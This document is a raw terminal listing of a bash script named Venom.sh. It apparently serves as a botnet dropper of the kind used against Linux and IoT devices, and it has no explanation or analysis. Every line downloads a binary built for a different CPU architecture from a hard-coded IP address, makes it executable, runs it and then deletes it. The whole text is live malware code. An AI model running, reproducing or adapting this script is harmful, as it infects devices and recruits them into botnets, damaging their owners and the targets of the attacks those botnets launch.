cat Venom.sh 
#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_M.ips; chmod +x Ouija_M.ips; ./Ouija_M.ips; rm -rf Ouija_M.ips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_M.psl; chmod +x Ouija_M.psl; ./Ouija_M.psl; rm -rf Ouija_M.psl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_S.h4; chmod +x Ouija_S.h4; ./Ouija_S.h4; rm -rf Ouija_S.h4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_x.86; chmod +x Ouija_x.86; ./Ouija_x.86; rm -rf Ouija_x.86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_A.rm6; chmod +x Ouija_A.rm6; ./Ouija_A.rm6; rm -rf Ouija_A.rm6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_x.32; chmod +x Ouija_x.32; ./Ouija_x.32; rm -rf Ouija_x.32
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_P.pc; chmod +x Ouija_P.pc; ./Ouija_P.pc; rm -rf Ouija_P.pc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_I.586; chmod +x Ouija_I.586; ./Ouija_I.586; rm -rf Ouija_I.586
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_M.68k; chmod +x Ouija_M.68k; ./Ouija_M.68k; rm -rf Ouija_M.68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_P.pc; chmod +x Ouija_P.pc; ./Ouija_P.pc; rm -rf Ouija_P.pc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_A.rm4; chmod +x Ouija_A.rm4; ./Ouija_A.rm4; rm -rf Ouija_A.rm4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.53.119/Ouija_A.rm5; chmod +x Ouija_A.rm5; ./Ouija_A.rm5; rm -rf Ouija_A.rm5